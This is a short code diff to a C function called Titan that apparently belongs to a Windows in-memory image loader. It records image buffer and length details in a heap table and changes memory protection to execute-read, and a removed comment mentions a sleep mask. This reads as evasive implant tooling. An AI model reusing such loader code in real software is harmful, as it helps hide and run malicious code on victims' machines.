@@ -141,21 +141,19 @@ D_SEC( B ) VOID WINAPI Titan( VOID )
 
 			/* Set Heap Parameters */
 			SLn = SLn + Sec->SizeOfRawData;
+			Tbl = C_PTR( PTR_TO_HOOK( Mem, Table ) );
 
-			if ( ( Tbl = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( TABLE ) ) ) != NULL ) {
+			if ( ( Tbl->Table = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( TABLE_HEAP ) ) ) != NULL ) {
 
 				/* Give information about image */
-				Tbl->RxBuffer       = U_PTR( Mem );
-				Tbl->RxLength       = U_PTR( SLn );
-				Tbl->ImageLength    = U_PTR( MLn );
+				Tbl->Table->RxBuffer       = U_PTR( Mem );
+				Tbl->Table->RxLength       = U_PTR( SLn );
+				Tbl->Table->ImageLength    = U_PTR( MLn );
 
 				/* Initiliaze heap list header */
-				InitializeListHead( &Tbl->HeapList );
+				InitializeListHead( &Tbl->Table->HeapList );
 
-				/* Set the table pointer */
-				*( PVOID * )( Mem ) = C_PTR( Tbl );
-
-				/* Change Memory Protection. note: Work on supporting SLEEP_MASK here! */
+				/* Change Memory Protection. */
 				if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Mem, &SLn, PAGE_EXECUTE_READ, &Prm ) ) ) {
 					/* Set the values we need! */
 					ELn = 0;
